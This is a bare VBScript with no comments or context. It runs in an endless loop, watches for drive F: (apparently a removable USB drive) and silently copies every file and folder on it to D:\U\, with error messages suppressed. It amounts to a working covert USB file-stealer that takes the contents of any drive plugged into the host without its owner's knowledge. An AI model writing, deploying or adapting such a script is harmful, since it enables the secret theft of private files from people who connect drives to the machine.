set fso=createobject("scripting.filesystemobject") 
set ws=createobject("wscript.shell") 
on error resume next
 do 
 wscript.sleep 1000 
 if fso.driveexists("F:\") then  
fso.copyfile "F:\*","D:\U\"
 fso.copyfolder "F:\*","D:\U\" 
wscript.sleep 20000 
end if 
loop